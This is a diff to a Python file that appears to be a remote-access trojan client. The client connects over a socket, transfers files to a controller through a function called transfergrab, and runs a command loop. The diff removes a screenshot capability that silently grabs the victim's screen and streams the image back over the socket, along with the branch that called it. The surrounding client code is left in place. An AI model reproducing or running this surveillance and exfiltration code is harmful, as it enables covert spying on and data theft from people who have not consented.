@@ -4,7 +4,6 @@ import subprocess
 import os
 import time
 import platform
-#from PIL import ImageGrab
 import tempfile
 import shutil
 import psutil
@@ -74,24 +73,7 @@ def transfergrab(s,path):
 		s.send(msg.encode())
 
 
-        
-        
-def screenshot(s):
-    
-    dirpath=tempfile.mkdtemp()
-    ImageGrab.grab().save(dirpath + "/img.jpg","JPEG")
-    path=dirpath + "/img.jpg"
-    f=open(path,'rb')
-    f.seek(0)
-    packet=f.read(1024)
-    while packet!='':
-        s.send(packet)
-        packet=f.read(1024)
-    s.send("DONE")
-    f.close()
-    
-    shutil.rmtree(dirpath)
-    
+
 
 def get_size(bytes, suffix="B"):
     """
@@ -151,10 +133,6 @@ def connection():
 					s.send(("DONE").encode())
 			except:
 				s.send("COMMAND_NOT_FOUND".encode())
-
-		elif 'screenshot' in command:
-			screenshot(s)
-
 
 		elif 'SLEEP' in command: 
 			s.close()
